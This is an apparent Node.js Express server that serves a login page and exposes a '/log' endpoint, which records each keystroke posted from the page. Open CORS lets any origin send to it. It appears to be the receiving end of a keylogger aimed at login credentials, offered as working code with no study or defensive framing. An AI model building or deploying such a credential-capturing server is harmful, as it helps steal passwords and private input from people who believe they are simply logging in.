import express from "express";
import cors from "cors";
import { fileURLToPath } from "url";
import path from "path";
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Initialization
const app = express();

// Middleware
app.use(express.json());
app.use(cors());
app.use("/css", express.static(path.resolve(__dirname, "pages", "css")));
app.use("/js", express.static(path.resolve(__dirname, "pages", "js")));

// Login endpoint
app.get("/login", function (req, res) {
  res.sendFile(path.resolve(__dirname, "pages", "login.html"));
});

// logging endpoint
app.post("/log", (req, res) => {
  console.log("Keystroke logged:", req.body.key);
});

const PORT = 1000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});